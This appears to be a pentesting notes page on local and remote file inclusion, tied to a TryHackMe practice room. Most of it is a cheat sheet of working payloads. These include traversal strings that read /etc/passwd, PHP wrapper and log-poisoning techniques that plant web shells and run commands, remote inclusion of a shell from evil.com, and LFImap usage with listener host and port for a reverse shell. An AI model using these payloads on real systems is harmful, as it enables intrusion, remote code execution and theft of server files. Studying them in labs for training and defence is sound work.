---
description: Notes about some basic File Insclusion attack
---

# File Inclusion

### Playground

* [**THM: File Inclusion, Path Traversal**](https://tryhackme.com/r/room/filepathtraversal)

### Dangerous Function Lead to File Inclusion

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
| `require()`/`require_once()` |         ✅        |      ✅      |        ❌       |
| `file_get_contents()`        |         ✅        |      ❌      |        ✅       |
| `fopen()`/`file()`           |         ✅        |      ❌      |        ❌       |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |         ✅        |      ❌      |        ❌       |
| `fs.sendFile()`              |         ✅        |      ❌      |        ❌       |
| `res.render()`               |         ✅        |      ✅      |        ❌       |
| **Java**                     |                  |             |                |
| `include`                    |         ✅        |      ❌      |        ❌       |
| `import`                     |         ✅        |      ✅      |        ✅       |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |         ✅        |      ❌      |        ❌       |
| `@Html.RemotePartial()`      |         ✅        |      ❌      |        ✅       |
| `Response.WriteFile()`       |         ✅        |      ❌      |        ❌       |
| `include`                    |         ✅        |      ✅      |        ✅       |

### Local File Inclusion (LFI)

Local File Inclusion (LFI) is a type of vulnerability where an attacker can exploit a web application to include files that are already present on the server. By manipulating input parameters, such as URLs or form fields, the attacker can trick the application into loading files from the local file system, potentially accessing sensitive information or executing malicious code.

#### Basic LFI Payloads

| Command                                                   | Description             |
| --------------------------------------------------------- | ----------------------- |
| `/etc/passwd`                                             | Basic LFI               |
| `../../../../etc/passwd`                                  | LFI with path traversal |
| `/../../../etc/passwd`                                    | LFI with name prefix    |
| `./languages/../../../../etc/passwd`                      | LFI with approved path  |
| `php://filter/read=convert.base64-encode/resource=config` | LFI with Base64 Filter  |
| `../../../../etc/passwd%00`                               | LFI with Null byte      |

#### Log Poisoning to RCE

```bash
# Inject Access Log
curl -X "<?php echo passthru(\$_GET['cmd']);?>" http://target.com/

# Access
http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id
```

Access Log Location

Apache:

* /var/log/apache/access.log
* /var/log/apache2/access.log
* /etc/httpd/logs/access\_log&#x20;

Nginx:

* /var/log/nginx/access.log

#### LFI to RCE

{% code overflow="wrap" %}
```bash
# Data Wrappers
http://target.com/index.php?page=/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# Input Wrappers
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target.com/index.php?page=php://input&cmd=id"

# Expect Wrappers
curl -s "http://target.com/index.php?page=expect://id"
```
{% endcode %}

### Remote File Inclusion (RFI)

In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow\_url\_include setting to be enabled.

{% code overflow="wrap" %}
```bash
http://target.com/index.php?page=ftp://user:pass@localhost/shell.php&cmd=id

http://target.com/index.php?page=http://evil.com/shell.php&cmd=id
```
{% endcode %}

### Automation

{% code overflow="wrap" %}
```bash
# Fuzzing Parameter
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://target.com/index.php?FUZZ=value' -fs 2309

# Check working payload with LFI wordlists
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://target.com/index.php?view=FUZZ' -fs 2309

# Read Apache2 Conf
curl http://target.com/index.php?view=../../../../../../../../../../../../../../../../../../etc/apache2/apache2.conf
```
{% endcode %}

### Tools

**LFImap**

```bash
# Install
git clone https://github.com/hansmach1ne/LFImap
cd LFImap/
python3 -m venv lfimap_env
source lfimap_env/bin/activate
pip3 install -r requirements.txt

# Usage
Usage:
python3 lfimap.py --help
python3 lfimap.py -U "http://10.10.70.223/playground.php?page=test" -a
python3 lfimap.py -U "http://10.10.70.223/playground.php?page=test" -x --lhost 10.9.245.106 --lport 443
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh33OpuqB9v3evsJlqTqijUPEdY4TF0sKMWuXC1VhMBCh7OIKkk_OplXm29b0KOURlBvtN0Y2hsfCHcHciCxuvVZ0L1uK_3jS9v1Z4Xs5VFgkw2RbFs28oPYwlJOG3p-tAhNcDx8uT4-0v72jgAEMP1KCqs0PYtXVRpTV1P740O_x9XhIHMTPVkDrQoRtM/s1332/lfimap.png" alt=""><figcaption><p>LFImap</p></figcaption></figure>

### WordLists

* https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
* https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
* https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

### References

* [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
